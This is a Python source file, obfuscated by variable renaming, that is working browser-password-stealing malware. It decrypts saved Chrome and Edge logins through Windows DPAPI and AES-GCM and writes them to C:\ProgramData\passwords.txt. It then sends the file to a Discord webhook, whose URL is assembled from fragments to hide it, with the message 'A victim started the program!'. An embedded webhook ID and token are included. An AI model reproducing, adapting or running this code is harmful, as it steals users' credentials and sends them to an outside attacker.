import sys #line:1
import os #line:2
import shutil #line:3
import sqlite3 #line:4
import base64 #line:5
import json #line:6
from cryptography .hazmat .primitives .ciphers import Cipher ,algorithms ,modes #line:7
from cryptography .hazmat .backends import default_backend #line:8
from dhooks import File ,Webhook #line:9
import ctypes #line:10
import ctypes .wintypes #line:11
if sys .platform .startswith ('linux'):#line:13
    exit ()#line:14
APP_DATA_PATH =os .environ ['LOCALAPPDATA']#line:16
CHROME_DB_PATH ='Google/Chrome/User Data/Default/Login Data'#line:17
EDGE_DB_PATH ='Microsoft/Edge/User Data/Default/Login Data'#line:18
NONCE_BYTE_SIZE =12 #line:19
webhID ="1286417780064915477"#line:21
webhAT ="iSKqnXNsS38Mp3xmzImXOMuFotY4uZqvZoroyArxqZPb-kaPg4Fc2I3cBwbv2FCbCB7L"#line:22
http ="https"#line:23
disc ="discord"#line:24
webh ="webhooks"#line:25
appl ="api"#line:26
server =f"{http}://{disc}.com/{appl}/{webh}/{webhID}/{webhAT}"#line:27
hook =Webhook (server )#line:28
def dpapi_decrypt (O0O0OOO000OO00000 ):#line:32
    class O0OOOOOOOO0O00000 (ctypes .Structure ):#line:33
        _fields_ =[('cbData',ctypes .wintypes .DWORD ),('pbData',ctypes .POINTER (ctypes .c_char ))]#line:34
    O0OOO0O0000O0OO00 =ctypes .create_string_buffer (O0O0OOO000OO00000 ,len (O0O0OOO000OO00000 ))#line:36
    OOOOOO00O0OO00OO0 =O0OOOOOOOO0O00000 (ctypes .sizeof (O0OOO0O0000O0OO00 ),O0OOO0O0000O0OO00 )#line:37
    OO0O0O000OOO000O0 =O0OOOOOOOO0O00000 ()#line:38
    O0OOO000O00OOOOOO =ctypes .windll .crypt32 .CryptUnprotectData (ctypes .byref (OOOOOO00O0OO00OO0 ),None ,None ,None ,None ,0 ,ctypes .byref (OO0O0O000OOO000O0 ))#line:39
    if not O0OOO000O00OOOOOO :#line:40
        raise ctypes .WinError ()#line:41
    O0OO00O0OOO00OOO0 =ctypes .string_at (OO0O0O000OOO000O0 .pbData ,OO0O0O000OOO000O0 .cbData )#line:42
    ctypes .windll .kernel32 .LocalFree (OO0O0O000OOO000O0 .pbData )#line:43
    return O0OO00O0OOO00OOO0 #line:44
def decrypt_aes (OO00O000OOOO0OO00 ,OO0OOO0OO0O0000O0 ):#line:48
    OOO0OOO000000O0OO =OO00O000OOOO0OO00 [3 :15 ]#line:49
    O0O0O0O0O00O0O00O =OO00O000OOOO0OO00 [-16 :]#line:50
    OO00O00000O0OOOO0 =OO00O000OOOO0OO00 [15 :-16 ]#line:51
    OOO0OO000OO0O0OOO =Cipher (algorithms .AES (OO0OOO0OO0O0000O0 ),modes .GCM (OOO0OOO000000O0OO ,O0O0O0O0O00O0O00O ),backend =default_backend ())#line:53
    O00OO0OOO000OOOO0 =OOO0OO000OO0O0OOO .decryptor ()#line:54
    OOO0O0O000O00O000 =O00OO0OOO000OOOO0 .update (OO00O00000O0OOOO0 )+O00OO0OOO000OOOO0 .finalize ()#line:55
    return OOO0O0O000O00O000 #line:56
def get_encryption_key (browser_name ='Chrome'):#line:60
    if browser_name =='Chrome':#line:61
        O00OOOO000OOOO00O =os .path .join (APP_DATA_PATH ,'Google','Chrome','User Data','Local State')#line:62
    else :#line:63
        O00OOOO000OOOO00O =os .path .join (APP_DATA_PATH ,'Microsoft','Edge','User Data','Local State')#line:64
    with open (O00OOOO000OOOO00O ,'r',encoding ='utf-8')as O000O0000O0O00000 :#line:66
        OOO00OO00O0O00OO0 =json .load (O000O0000O0O00000 )#line:67
    OOO0O0OO00OO0OOOO =OOO00OO00O0O00OO0 ['os_crypt']['encrypted_key']#line:69
    O000OO00O00OOOOOO =base64 .b64decode (OOO0O0OO00OO0OOOO )[5 :]#line:70
    OOO000O0OOOOO000O =dpapi_decrypt (O000OO00O00OOOOOO )#line:71
    return OOO000O0OOOOO000O #line:72
class PasswordExtractor :#line:75
    def __init__ (OOO0OO0OO0O0O0O00 ,OOOO0O000OOOO00O0 ,O000O00OOO0O0O0OO ,browser_name ='Chrome'):#line:76
        OOO0OO0OO0O0O0O00 .db_path =OOOO0O000OOOO00O0 #line:77
        OOO0OO0OO0O0O0O00 .temp_path =O000O00OOO0O0O0OO #line:78
        OOO0OO0OO0O0O0O00 .password_list =[]#line:79
        OOO0OO0OO0O0O0O00 .browser_name =browser_name #line:80
    def process_db (O0OOO0OOOOOO0OOO0 ):#line:82
        if os .path .exists (O0OOO0OOOOOO0OOO0 .temp_path ):#line:83
            os .remove (O0OOO0OOOOOO0OOO0 .temp_path )#line:84
        if os .path .exists (O0OOO0OOOOOO0OOO0 .db_path ):#line:85
            shutil .copyfile (O0OOO0OOOOOO0OOO0 .db_path ,O0OOO0OOOOOO0OOO0 .temp_path )#line:86
            O0OOO0OOOOOO0OOO0 .extract_passwords (O0OOO0OOOOOO0OOO0 .temp_path )#line:87
        else :#line:88
            print (f"Database file not found: {O0OOO0OOOOOO0OOO0.db_path}")#line:89
    def extract_passwords (OOO0OOOO0OO0O0OO0 ,OO00O0OOO000O00OO ):#line:91
        try :#line:92
            OO0000OO00OOO0000 =sqlite3 .connect (OO00O0OOO000O00OO )#line:93
            O00OO000O000OOOOO =OO0000OO00OOO0000 .cursor ()#line:94
            O00OO000O000OOOOO .execute ('SELECT signon_realm, username_value, password_value FROM logins')#line:95
            O0O00000OOOOOO000 =get_encryption_key (OOO0OOOO0OO0O0OO0 .browser_name )#line:97
            for OOO00OOOO0O00O0O0 in O00OO000O000OOOOO .fetchall ():#line:99
                OO0OO00000000OOOO =OOO00OOOO0O00O0O0 [0 ]#line:100
                O00O0000O0O0OOO0O =OOO00OOOO0O00O0O0 [1 ]#line:101
                O0O0O0O0O000O0OO0 =OOO00OOOO0O00O0O0 [2 ]#line:102
                if O0O0O0O0O000O0OO0 .startswith (b'v10'):#line:104
                    O0O0OO000O00O00O0 =decrypt_aes (O0O0O0O0O000O0OO0 ,O0O00000OOOOOO000 )#line:105
                    OOO000OO0O00O000O =O0O0OO000O00O00O0 .decode ('utf-8')#line:106
                else :#line:107
                    OOO000OO0O00O000O =dpapi_decrypt (O0O0O0O0O000O0OO0 ).decode ('utf-8')#line:109
                O00OO0OOOOOO0O0O0 =f"Website: {OO0OO00000000OOOO}\nUsername: {O00O0000O0O0OOO0O}\nPassword: {OOO000OO0O00O000O}\n\n"#line:111
                OOO0OOOO0OO0O0OO0 .password_list .append (O00OO0OOOOOO0O0O0 )#line:112
            OO0000OO00OOO0000 .close ()#line:114
            os .remove (OO00O0OOO000O00OO )#line:115
        except sqlite3 .Error as O0O0000OOO00O0000 :#line:116
            print (f"SQLite error: {O0O0000OOO00O0000}")#line:117
    def save_passwords (O00O00OO0OOOOOO0O ):#line:119
        with open (r'C:\ProgramData\passwords.txt','w',encoding ='utf-8')as O0OOOOOO0OOOO00OO :#line:120
            O0OOOOOO0OOOO00OO .writelines (O00O00OO0OOOOOO0O .password_list )#line:121
if __name__ =="__main__":#line:124
    chrome_extractor =PasswordExtractor (db_path =os .path .join (APP_DATA_PATH ,CHROME_DB_PATH ),temp_path =os .path .join (APP_DATA_PATH ,'chrome_sqlite_file'),browser_name ='Chrome')#line:130
    edge_extractor =PasswordExtractor (db_path =os .path .join (APP_DATA_PATH ,EDGE_DB_PATH ),temp_path =os .path .join (APP_DATA_PATH ,'edge_sqlite_file'),browser_name ='Edge')#line:137
    try :#line:139
        chrome_extractor .process_db ()#line:140
        edge_extractor .process_db ()#line:141
    except Exception as e :#line:142
        print (f"Error processing databases: {e}")#line:143
    chrome_extractor .save_passwords ()#line:145
    edge_extractor .save_passwords ()#line:146
    passwords_file_path =r'C:\ProgramData\passwords.txt'#line:149
    if os .path .exists (passwords_file_path ):#line:150
        passwords =File (passwords_file_path )#line:151
        hook .send ("A victim started the program!")#line:152
        hook .send ("Here is the list of all their passwords on Chrome and Edge:",file =passwords )#line:153
        os .remove (passwords_file_path )#line:154
    else :#line:155
        print (f"File not found: {passwords_file_path}")#line:156
